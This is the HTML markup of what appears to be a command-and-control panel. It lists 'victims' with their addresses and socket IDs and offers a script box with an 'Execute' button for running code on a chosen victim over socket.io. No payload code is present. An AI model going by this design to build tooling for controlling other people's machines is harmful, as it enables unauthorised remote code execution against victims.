<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js" integrity="sha384-/KNQL8Nu5gCHLqwqfQjA689Hhoqgi2S84SNUxC3roTe4EhJ9AfLkp8QiQcU8AMzI" crossorigin="anonymous"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300;400;500;600;700;800;900&display=swap"rel="stylesheet">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
    <script defer src="./js/script.js"></script>
    <link rel="stylesheet" href="./css/style.css">
    <title>Document</title>
</head>

<body>
    <div class="main">
        <div class="left">
            <ul class="victims">
                <li id="-1" onclick="pickVictim('-1')">
                    <span class="material-symbols-rounded">person</span>
                    <span>Total : 0 </span>
                </li>
                <div class="hr"></div>
            </ul>
            <div class="left-navigation">
                <span id="nbr-page">9</span>
                <span class="material-symbols-rounded">chevron_right</span>
                <span class="material-symbols-rounded">autorenew</span>
            </div>
            
        </div>
        <div class="right">
            <div class="info" id="-1">
                <span class="address"><b>address :</b>  ________</span>
                <span class="socketId"><b>socket ID :</b> ________</span>
            </div>
            <textarea name="" id="script" cols="30" rows="10"></textarea>
            <button id="execute">Execute</button>
            <textarea name="" id="resultScript" cols="30" rows="15"></textarea>
        </div>

</body>

</html>